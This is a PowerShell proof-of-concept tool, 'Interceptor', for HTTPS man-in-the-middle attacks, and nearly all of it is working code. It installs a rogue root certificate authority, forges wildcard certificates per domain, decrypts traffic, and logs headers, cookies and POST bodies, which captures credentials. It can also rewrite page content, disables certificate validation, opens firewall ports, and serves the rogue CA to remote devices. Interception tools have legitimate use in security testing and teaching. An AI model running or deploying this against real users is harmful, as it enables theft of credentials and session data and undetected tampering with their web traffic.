<#
.SYNOPSIS

This script demonstrates the ability to capture and tamper with Web sessions.  
For secure sessions, this is done by dynamically writing certificates to match the requested domain. 
This is only proof-of-concept, and should be used cautiously, to demonstrate the effects of such an attack. 
This script requires local administrative privileges to execute properly.  

Function: Interceptor
Author: Casey Smith, Twitter: @_subTee
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 3.9 (Updated with comprehensive logging)
Release Date: 


.DESCRIPTION

This script sets up an HTTP(s) proxy server on a configurable port.  
It will write the request headers and response headers to output and to a log file.
Updated to use wildcard certificates for better performance and certificate reuse.
Now includes comprehensive logging of all headers, POST parameters, and responses.

.PARAMETER ListenPort

Configurable Port to listen for incoming Web requests.  The Default is 8081

.PARAMETER ProxyServer

In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server.  
Default behavior expects no upstream proxy.

.PARAMETER ProxyPort

In many environments it will be necessary to chain HTTP(s) requests upstream to another proxy server.  
This sets the Port for the upstream proxy

.PARAMETER Tamper

Sometimes replaces "Cyber" with "Kitten"

.PARAMETER HostCA

This allows remote devices to connect and install the Interceptor Root Certificate Authority
From the remote/mobile device browse to http://[InterceptorIP]:8082/i.cer
example: http://192.168.1.1:8082/i.cer

.PARAMETER AutoProxyConfig

This will alter the system proxy settings to drive traffic through Interceptor.

.PARAMETER Cleanup

Removes any installed certificates and exits.


.EXAMPLE

Interceptor.ps1 -ProxyServer localhost -ProxyPort 8888 
Interceptor.ps1 -Tamper 
Interceptor.ps1 -HostCA

.NOTES
This script attempts to make SSL MITM accessible, by being a small compact proof of concept script.  
It can be used to demonstrate the effects of malicious software. 
This script requires that you manually change your Browser Proxy Settings to direct traffic to Interceptor. 
It will install Certificates in your Trusted Root Store.  Use at your own risk :)

.LINK



#>
[CmdletBinding()]
Param(
  [Parameter(Mandatory=$False,Position=0)]
  [int]$ListenPort,
  
  [Parameter(Mandatory=$False,Position=1)]
  [string]$ProxyServer,
  
  [Parameter(Mandatory=$False,Position=2)]
  [int]$ProxyPort,
  
  [Parameter(Mandatory=$False,Position=3)]
  [switch]$Tamper,
  
  [Parameter(Mandatory=$False,Position=4)]
  [switch]$HostCA,
  
  [Parameter(Mandatory=$False,Position=6)]
  [switch]$Cleanup
)

# Global logging variables
$script:LogFile = Join-Path $PSScriptRoot ("Interceptor_Log_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".log")
$script:LogMutex = New-Object System.Threading.Mutex($false, "InterceptorLogMutex")
$script:RequestCounter = 0

function Write-InterceptorLog([string]$message, [string]$color = "Yellow")
{
    $script:LogMutex.WaitOne() | Out-Null
    try
    {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
        $logMessage = $timestamp + " | " + $message
        Add-Content -Path $script:LogFile -Value $logMessage
        
        # Also write to console with color
        switch($color)
        {
            "Green" { Write-Host $logMessage -ForegroundColor Green }
            "Red" { Write-Host $logMessage -ForegroundColor Red }
            "Cyan" { Write-Host $logMessage -ForegroundColor Cyan }
            "Magenta" { Write-Host $logMessage -ForegroundColor Magenta }
            default { Write-Host $logMessage -ForegroundColor Yellow }
        }
    }
    finally
    {
        $script:LogMutex.ReleaseMutex()
    }
}

function Get-BaseDomain([string] $hostname)
{
    # Extract base domain from hostname
    # For example: www.example.com -> example.com
    # sub.domain.example.com -> example.com
    
    $parts = $hostname.Split('.')
    $partCount = $parts.Length
    
    # Handle special cases
    if ($partCount -le 2)
    {
        return $hostname
    }
    
    # Return the last two parts (domain.tld)
    $baseDomain = $parts[$partCount - 2] + "." + $parts[$partCount - 1]
    return $baseDomain
}

function Start-CertificateAuthority()
{
	#Thanks to @obscuresec for this Web Host
	#Pulls CA Certificate from Store and Writes Directly back to Mobile Device
	# example: http://localhost:8082/i.cer
	Start-Job -ScriptBlock {
			
			$Hso = New-Object Net.HttpListener
			$Hso.Prefixes.Add("http://+:8082/")
			$Hso.Start()
			While ($Hso.IsListening) {
				$HC = $Hso.GetContext()
				$HRes = $HC.Response
				$HRes.Headers.Add("Content-Type","application/x-x509-ca-cert")
				$cert = Get-ChildItem cert:\LocalMachine\Root | where { $_.Issuer -match "__Interceptor_Trusted_Root" }
				$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::cert
				$Buf = $cert.Export($type)
				$HRes.OutputStream.Write($Buf,0,$Buf.Length)
				$HRes.Close()
			}
				
		}
	
	
	
}

function Invoke-RemoveCertificates([string] $issuedBy)
{
	$certs = Get-ChildItem cert:\LocalMachine\My | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
		foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}
	#Remove Any Trusted Root Certificates
	$certs = Get-ChildItem cert:\LocalMachine\Root | where { $_.Issuer -match $issuedBy }
	if($certs)
	{
	foreach ($cert in $certs) 
		{
			$store = Get-Item $cert.PSParentPath
			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
			$store.Remove($cert)
			$store.Close()
		}
	}
	[Console]::WriteLine("Certificates Removed")
		
}

function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA, [bool] $isWildcard)
{
    $issuer = "__Interceptor_Trusted_Root"
    $subject = "CN=" + $certSubject
    $notBefore = (Get-Date).AddDays(-1)
    $notAfter = $notBefore.AddDays(90)
    
    # Certificate parameters for ECDSA
    $certParams = @{
        Subject = $subject
        NotBefore = $notBefore
        NotAfter = $notAfter
        CertStoreLocation = "Cert:\LocalMachine\My"
        HashAlgorithm = "SHA256"
        KeyAlgorithm = "ECDsa_nistP256"
        KeyExportPolicy = "Exportable"
        TextExtension = @("2.5.29.37={text}1.3.6.1.5.5.7.3.1") # Server Authentication EKU
    }
    
    if ($isCA)
    {
        # Create self-signed CA certificate
        $certParams['KeyUsage'] = @("CertSign", "DigitalSignature")
        $certParams['TextExtension'] += "2.5.29.19={text}CA=TRUE&pathlength=1" # Basic Constraints
        
        $certificate = New-SelfSignedCertificate @certParams
        
        # Install CA certificate to Root store
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store "Root", "LocalMachine"
        $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
        $store.Add($certificate)
        $store.Close()
        
        return $certificate
    }
    else
    {
        # Get the CA certificate to sign with
        $signer = Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.Subject -match $issuer } | Select-Object -First 1
        
        if ($null -eq $signer)
        {
            throw "CA certificate not found. Create CA certificate first."
        }
        
        # Add DnsName for Subject Alternative Name (required by modern browsers)
        if ($isWildcard)
        {
            # Extract base domain from wildcard (*.example.com -> example.com)
            $baseDomain = $certSubject.TrimStart('*').TrimStart('.')
            # Add both wildcard and base domain to SAN
            $certParams['DnsName'] = @($certSubject, $baseDomain)
        }
        else
        {
            $certParams['DnsName'] = @($certSubject)
        }
        
        $certParams['Signer'] = $signer
        $certParams['KeyUsage'] = @("DigitalSignature", "KeyEncipherment")
        
        $certificate = New-SelfSignedCertificate @certParams
        
        return $certificate
    }
}

function Receive-ServerHttpResponse ([System.Net.WebResponse] $response, [int] $requestId)
{
	#Returns a Byte[] from HTTPWebRequest, also for HttpWebRequest Exception Handling
	Try
	{
		[string]$rawProtocolVersion = "HTTP/" + $response.ProtocolVersion
		[int]$rawStatusCode = [int]$response.StatusCode
		[string]$rawStatusDescription = [string]$response.StatusDescription
		$rawHeadersString = New-Object System.Text.StringBuilder 
		$rawHeaderCollection = $response.Headers
		$rawHeaders = $response.Headers.AllKeys
		[bool] $transferEncoding = $false 
		# This is used for Chunked Processing.
		
		# Log response status
		Write-InterceptorLog ("===== RESPONSE [#" + $requestId + "] =====") "Cyan"
		Write-InterceptorLog ("Status: " + $rawStatusCode + " " + $rawStatusDescription) "Cyan"
		
		foreach($s in $rawHeaders)
		{
			 #We'll handle setting cookies later
			if($s -eq "Set-Cookie") { Continue }
			if($s -eq "Transfer-Encoding") 
			{
				$transferEncoding = $true
				continue
			}
			[void]$rawHeadersString.AppendLine($s + ": " + $rawHeaderCollection.Get($s) ) #Use [void] or you will get extra string stuff.
			
			# Log each response header
			Write-InterceptorLog ("Response Header: " + $s + ": " + $rawHeaderCollection.Get($s)) "Cyan"
		}
	
		$setCookieString = $rawHeaderCollection.Get("Set-Cookie") -Split '($|,(?! ))' #Split on "," but not ", "
		if($setCookieString)
		{
			foreach ($respCookie in $setCookieString)
			{
				if($respCookie -eq "," -Or $respCookie -eq "") {continue}
				[void]$rawHeadersString.AppendLine("Set-Cookie: " + $respCookie)
				# Log cookies
				Write-InterceptorLog ("Response Cookie: " + $respCookie) "Cyan"
			}
		}
		
		$responseStream = $response.GetResponseStream()
		
		$rstring = $rawProtocolVersion + " " + $rawStatusCode + " " + $rawStatusDescription + "`r`n" + $rawHeadersString.ToString() + "`r`n"
		
		[byte[]] $rawHeaderBytes = [System.Text.Encoding]::Ascii.GetBytes($rstring)
		
		[void][byte[]] $outdata 
		$tempMemStream = New-Object System.IO.MemoryStream
		[byte[]] $respbuffer = New-Object Byte[] 32768 # 32768
		
		# Define your replacements at the top (outside the if statements)
        $TamperReplacements = @{
            'Cyber' = 'Kitten'
            'Attack' = 'Hug'
            'Malware' = 'Puppies'
            'Threat' = 'Friend'
        }

        if($transferEncoding)
        {
            $reader = New-Object System.IO.StreamReader($responseStream)
            [string] $responseFromServer = $reader.ReadToEnd()

            if ($Tamper)
            {
                foreach ($match in $TamperReplacements.Keys)
                {
                    if ($responseFromServer -match $match)
                    {
                        $responseFromServer = $responseFromServer -replace $match, $TamperReplacements[$match]
                        Write-InterceptorLog ("Tampered: Replaced '" + $match + "' with '" + $TamperReplacements[$match] + "'") "Magenta"
                    }
                }
            }

            $outdata = [System.Text.Encoding]::UTF8.GetBytes($responseFromServer)
            $reader.Close()
        }
        else
        {
            while($true)
            {
                [int] $read = $responseStream.Read($respbuffer, 0, $respbuffer.Length)
                if($read -le 0)
                {
                    $outdata = $tempMemStream.ToArray()
                    break
                }
                $tempMemStream.Write($respbuffer, 0, $read)
            }

            if ($Tamper -And $response.ContentType -match "text/html")
            {
                $outdataReplace = [System.Text.Encoding]::UTF8.GetString($outdata)
        
                # Apply all replacements from the hashtable
                foreach ($match in $TamperReplacements.Keys)
                {
                    if ($outdataReplace -match $match)
                    {
                        $outdataReplace = $outdataReplace -replace $match, $TamperReplacements[$match]
                        Write-InterceptorLog ("Tampered: Replaced '" + $match + "' with '" + $TamperReplacements[$match] + "'") "Magenta"
                    }
                }
        
                $outdata = [System.Text.Encoding]::UTF8.GetBytes($outdataReplace)
            }
        }
        
        # Log response size
        Write-InterceptorLog ("Response Body Size: " + $outdata.Length + " bytes") "Cyan"
        Write-InterceptorLog ("===== END RESPONSE [#" + $requestId + "] =====") "Cyan"

        [byte[]] $rv = New-Object Byte[] ($rawHeaderBytes.Length + $outdata.Length)
        #Combine Header Bytes and Entity Bytes 
        [System.Buffer]::BlockCopy( $rawHeaderBytes, 0, $rv, 0, $rawHeaderBytes.Length)
        [System.Buffer]::BlockCopy( $outdata, 0, $rv, $rawHeaderBytes.Length, $outdata.Length)
	
		
		$tempMemStream.Close()
		$response.Close()
		
		return $rv
	}
	Catch [System.Exception]
	{
		[Console]::WriteLine("Get Response Error")
		[Console]::WriteLine($_.Exception.Message)
		Write-InterceptorLog ("Response Error: " + $_.Exception.Message) "Red"
    }#End Catch
	
}

function Send-ServerHttpRequest([string] $URI, [string] $httpMethod,[byte[]] $requestBytes, [System.Net.WebProxy] $proxy, [int] $requestId )
{	
	#Prepare and Send an HttpWebRequest From Byte[] Returns Byte[]
	Try
	{
		$requestParse = [System.Text.Encoding]::UTF8.GetString($requestBytes)
		[string[]] $requestString = ($requestParse -split '[\r\n]') |? {$_} 
		
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
		[System.Net.HttpWebRequest] $request = [System.Net.HttpWebRequest] [System.Net.WebRequest]::Create($URI)	
		
		$request.KeepAlive = $false
		$request.ProtocolVersion = [System.Net.Httpversion]::version11 
		$request.ServicePoint.ConnectionLimit = 1
		if($proxy -eq $null) { $request.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() }
		else { $request.Proxy = $proxy }
		$request.Method = $httpMethod
		$request.AllowAutoRedirect = $false 
		$request.AutomaticDecompression = [System.Net.DecompressionMethods]::None
	
		For ($i = 1; $i -le $requestString.Length; $i++)
		{
			$line = $requestString[$i] -split ": " 
			if ( $line[0] -eq "Host" -Or $line[0] -eq $null ) { continue }
			Try
			{
				#Add Header Properties Defined By Class
				switch($line[0])
				{
					"Accept" { $request.Accept = $line[1] }
					"Connection" { "" }
					"Content-Length" { $request.ContentLength = $line[1] }
					"Content-Type" { $request.ContentType = $line[1] }
					"Expect" { $request.Expect = $line[1] }
					"Date" { $request.Date = $line[1] }
					"If-Modified-Since" { $request.IfModifiedSince = $line[1] }
					"Range" { $request.Range = $line[1] }
					"Referer" { $request.Referer = $line[1] }
					"User-Agent" { $request.UserAgent = $line[1]  } #+ " Intercepted Traffic"} 
					# Added Tampering Here...User-Agent Example
					"Transfer-Encoding"  { $request.TransferEncoding = $line[1] } 
					default {
								if($line[0] -eq "Accept-Encoding")
								{	
									$request.Headers.Add( $line[0], " ") #Take that Gzip...
									#Otherwise have to decompress response to tamper with content...
								}
								else
								{
									$request.Headers.Add( $line[0], $line[1])
								}	
	
							}
				}
				
			}
			Catch
			{
				
			}
		}
			
		if (($httpMethod -eq "POST") -And ($request.ContentLength -gt 0)) 
		{
			[System.IO.Stream] $outputStream = [System.IO.Stream]$request.GetRequestStream()
			$outputStream.Write($requestBytes, $requestBytes.Length - $request.ContentLength, $request.ContentLength)
			$outputStream.Close()
		}
		
		
		return Receive-ServerHttpResponse $request.GetResponse() $requestId
		
	}
	Catch [System.Net.WebException]
	{
		#HTTPWebRequest  Throws exceptions based on Server Response.  So catch and return server response
		if ($_.Exception.Response) 
		{
			return Receive-ServerHttpResponse $_.Exception.Response $requestId
        }
			
    }#End Catch Web Exception
	Catch [System.Exception]
	{	
		Write-Verbose $_.Exception.Message
		Write-InterceptorLog ("Send Request Error: " + $_.Exception.Message) "Red"
	}#End General Exception Occured...
	
}#Proxied Get

function Receive-ClientHttpRequest([System.Net.Sockets.TcpClient] $client, [System.Net.WebProxy] $proxy)
{
    $clientStream = $null
    $sslStream    = $null

    try {
        $clientStream = $client.GetStream()
        $byteArray = New-Object System.Byte[] 32768
        [byte[]] $byteClientRequest = @()

        # Increment request counter
        $script:RequestCounter++
        $currentRequestId = $script:RequestCounter

        do {
            [int] $NumBytesRead = $clientStream.Read($byteArray, 0, $byteArray.Length)
            if ($NumBytesRead -le 0) { break }
            $byteClientRequest += $byteArray[0..($NumBytesRead - 1)]
        } while ($clientStream.DataAvailable -and $NumBytesRead -gt 0)

        $requestString = [System.Text.Encoding]::UTF8.GetString($byteClientRequest)
        [string[]] $requestArray = ($requestString -split '[\r\n]') | ? { $_ }
        [string[]] $methodParse = $requestArray[0] -split " "

        # Log HTTP Request
        Write-InterceptorLog ("===== REQUEST [#" + $currentRequestId + "] =====") "Green"
        Write-InterceptorLog ("Client: " + $client.Client.RemoteEndPoint.ToString()) "Green"
        Write-InterceptorLog ("Method: " + $methodParse[0] + " URL: " + $methodParse[1]) "Green"

        for ($i = 1; $i -lt $requestArray.Length; $i++) {
            if ($requestArray[$i].Length -gt 0) {
                Write-InterceptorLog ("Request Header: " + $requestArray[$i]) "Green"
            }
        }

        # Extract POST/PUT/PATCH data
        if ($methodParse[0] -in @("POST","PUT","PATCH")) {
            $bodyStartIndex = $requestString.IndexOf("`r`n`r`n")
            if ($bodyStartIndex -gt -1) {
                $postData = $requestString.Substring($bodyStartIndex + 4)
                if ($postData.Length -gt 0) {
                    Write-InterceptorLog ("Request Body (" + $methodParse[0] + " Data):") "Magenta"
                    Write-InterceptorLog $postData "Magenta"
                }
            }
        }

        Write-InterceptorLog ("===== END REQUEST [#" + $currentRequestId + "] =====") "Green"

        # CONNECT / HTTPS MITM
        if ($methodParse[0] -ceq "CONNECT") {
            [string[]] $domainParse     = $methodParse[1].Split(":")
            $requestedHostname          = $domainParse[0]
            Write-InterceptorLog ("CONNECT to: " + $requestedHostname) "Yellow"

            $baseDomain     = Get-BaseDomain $requestedHostname
            $wildcardSubject = "*." + $baseDomain

            $connectSpoof = [System.Text.Encoding]::Ascii.GetBytes(
                "HTTP/1.1 200 Connection Established`r`nTimeStamp: " +
                [System.DateTime]::Now.ToString() + "`r`n`r`n"
            )
            $clientStream.Write($connectSpoof, 0, $connectSpoof.Length)
            $clientStream.Flush()

            $sslStream = New-Object System.Net.Security.SslStream($clientStream, $false)
            # Increase timeouts so CI latency doesn't kill it
            $sslStream.ReadTimeout  = 30000
            $sslStream.WriteTimeout = 30000

            $sslcertfake = Get-ChildItem Cert:\LocalMachine\My | Where-Object {
                $_.Subject -eq ("CN=" + $wildcardSubject)
            } | Select-Object -First 1

            if (-not $sslcertfake) {
                Write-Host ("Creating wildcard certificate for: " + $wildcardSubject) -ForegroundColor Green
                Write-InterceptorLog ("Creating wildcard certificate for: " + $wildcardSubject) "Green"
                $sslcertfake = Invoke-CreateCertificate $wildcardSubject $false $true
            } else {
                Write-Host ("Using existing wildcard certificate for: " + $wildcardSubject) -ForegroundColor Cyan
                Write-InterceptorLog ("Using existing wildcard certificate for: " + $wildcardSubject) "Cyan"
            }

            if (-not $sslcertfake.HasPrivateKey) {
                throw "Certificate for " + $wildcardSubject + " has no private key. Cannot authenticate as server."
            }

            $protocols = [System.Security.Authentication.SslProtocols]::Tls13 -bor
                         [System.Security.Authentication.SslProtocols]::Tls12

            $sslStream.AuthenticateAsServer($sslcertfake, $false, $protocols, $false)

            $sslbyteArray = New-Object System.Byte[] 32768
            [byte[]] $sslbyteClientRequest = @()

            do {
                [int] $NumBytesRead = $sslStream.Read($sslbyteArray, 0, $sslbyteArray.Length)
                if ($NumBytesRead -le 0) { break }
                $sslbyteClientRequest += $sslbyteArray[0..($NumBytesRead - 1)]
            } while ($sslStream.DataAvailable)

            $SSLRequest = [System.Text.Encoding]::UTF8.GetString($sslbyteClientRequest)
            [string[]] $SSLrequestArray = ($SSLRequest -split '[\r\n]') | ? { $_ }
            [string[]] $SSLmethodParse  = $SSLrequestArray[0] -split " "

            $secureURI = "https://" + $requestedHostname + $SSLmethodParse[1]

            Write-InterceptorLog ("===== HTTPS REQUEST [#" + $currentRequestId + "] =====") "Green"
            Write-InterceptorLog ("Secure Method: " + $SSLmethodParse[0] +
                                  " Secure URL: " + $secureURI) "Green"

            for ($i = 1; $i -lt $SSLrequestArray.Length; $i++) {
                if ($SSLrequestArray[$i].Length -gt 0) {
                    Write-InterceptorLog ("HTTPS Header: " + $SSLrequestArray[$i]) "Green"
                }
            }

            if ($SSLmethodParse[0] -in @("POST","PUT","PATCH")) {
                $bodyStartIndex = $SSLRequest.IndexOf("`r`n`r`n")
                if ($bodyStartIndex -gt -1) {
                    $postData = $SSLRequest.Substring($bodyStartIndex + 4)
                    if ($postData.Length -gt 0) {
                        Write-InterceptorLog ("HTTPS Body (" + $SSLmethodParse[0] + " Data):") "Magenta"
                        Write-InterceptorLog $postData "Magenta"
                    }
                }
            }

            Write-InterceptorLog ("===== END HTTPS REQUEST [#" + $currentRequestId + "] =====") "Green"

            [byte[]] $byteResponse = Send-ServerHttpRequest $secureURI $SSLmethodParse[0] $sslbyteClientRequest $proxy $currentRequestId

            if ($byteResponse[0] -eq '0x00') {
                $sslStream.Write($byteResponse, 1, $byteResponse.Length - 1)
            } else {
                $sslStream.Write($byteResponse, 0, $byteResponse.Length)
            }
            $sslStream.Flush()
        }
        else {
            # Plain HTTP proxy path
            [byte[]] $proxiedResponse = Send-ServerHttpRequest $methodParse[1] $methodParse[0] $byteClientRequest $proxy $currentRequestId

            if ($proxiedResponse[0] -eq '0x00') {
                $clientStream.Write($proxiedResponse, 1, $proxiedResponse.Length - 1)
            } else {
                $clientStream.Write($proxiedResponse, 0, $proxiedResponse.Length)
            }
            $clientStream.Flush()
        }

    } catch {
        Write-Verbose $_.Exception.Message
        Write-InterceptorLog ("Client Request Error: " + $_.Exception.Message) "Red"
        # No explicit Close() here; let Finally handle cleanup so TLS shutdown can be attempted.
    } finally {
        if ($sslStream -ne $null) {
            try { $sslStream.Flush() } catch {}
            try { $sslStream.Dispose() } catch {}
        }
        if ($clientStream -ne $null) {
            try { $clientStream.Dispose() } catch {}
        }
        if ($client -ne $null) {
            try { $client.Close() } catch {}
        }
    }
}


function Main()
{	
	if($Cleanup)
	{
		Invoke-RemoveCertificates( "__Interceptor_Trusted_Root" )
		exit
	}
	
	# Initialize logging
	Write-InterceptorLog "========================================" "Cyan"
	Write-InterceptorLog "Interceptor Proxy Starting" "Cyan"
	Write-InterceptorLog "Version: 3.9 (with comprehensive logging)" "Cyan"
	Write-InterceptorLog "========================================" "Cyan"
	
	# Log parameters
	if($Tamper) { Write-InterceptorLog "Tamper Mode: ENABLED" "Magenta" }
	if($ProxyServer) { Write-InterceptorLog ("Upstream Proxy: " + $ProxyServer + ":" + $ProxyPort) "Yellow" }
	
	# Create And Install Trusted Root CA.
	$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__Interceptor_Trusted_Root"  })
	if ($CACertificate -eq $null)
	{
		Write-InterceptorLog "Creating Root CA Certificate" "Green"
		Invoke-CreateCertificate "__Interceptor_Trusted_Root" $true $false
	}
	else
	{
		Write-InterceptorLog "Root CA Certificate already exists" "Green"
	}
	
	# Create Some Certificates Early to Speed up Capture. If you wanted to...
	# You could Add Auto Proxy Configuration here too.
	
	if($HostCA)
	{
		netsh advfirewall firewall delete rule name="Interceptor Proxy 8082" | Out-Null #First Run May Throw Error...Thats Ok..:)
		netsh advfirewall firewall add rule name="Interceptor Proxy 8082" dir=in action=allow protocol=TCP localport=8082 | Out-Null
		Start-CertificateAuthority
		Write-InterceptorLog "Certificate Authority hosted on port 8082" "Green"
	}
	
	if($ListenPort)
	{
		$port = $ListenPort
	}
	else
	{
		$port = 8081
	}
	
	$endpoint = New-Object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
	$listener = New-Object System.Net.Sockets.TcpListener $endpoint
	
	#This sets up a local firewall rule to suppress the Windows "Allow Listening Port Prompt"
	netsh advfirewall firewall delete rule name="Interceptor Proxy $port" | Out-Null #First Run May Throw Error...Thats Ok..:)
	netsh advfirewall firewall add rule name="Interceptor Proxy $port" dir=in action=allow protocol=TCP localport=$port | Out-Null
	
	
	if($ProxyServer)
	{
		$proxy = New-Object System.Net.WebProxy($ProxyServer, $ProxyPort)
		[Console]::WriteLine("Using Proxy Server " + $ProxyServer + " : " + $ProxyPort)
		Write-InterceptorLog ("Configured to use upstream proxy: " + $ProxyServer + ":" + $ProxyPort) "Yellow"
	}
	else
	{
		$proxy = $null
		# If you are going Direct.  You need this to be null, or HTTPWebrequest loops...
		[Console]::WriteLine("Using Direct Internet Connection")
		Write-InterceptorLog "Using Direct Internet Connection" "Yellow"
	}
		
	
	$listener.Start()
	[Console]::WriteLine("Listening on " + $port)
	[Console]::WriteLine("Logging to: " + $script:LogFile)
	
	Write-InterceptorLog ("Interceptor listening on port " + $port) "Green"
	Write-InterceptorLog ("Log file: " + $script:LogFile) "Green"
	Write-InterceptorLog "========================================" "Cyan"
	Write-InterceptorLog "Waiting for connections..." "Yellow"
	
	$client = New-Object System.Net.Sockets.TcpClient
	$client.NoDelay = $true
	
	
	
	while($true)
	{
		
		$client = $listener.AcceptTcpClient()
		if($client -ne $null)
		{
			Receive-ClientHttpRequest $client $proxy
		}
		
	}
	

}

Main
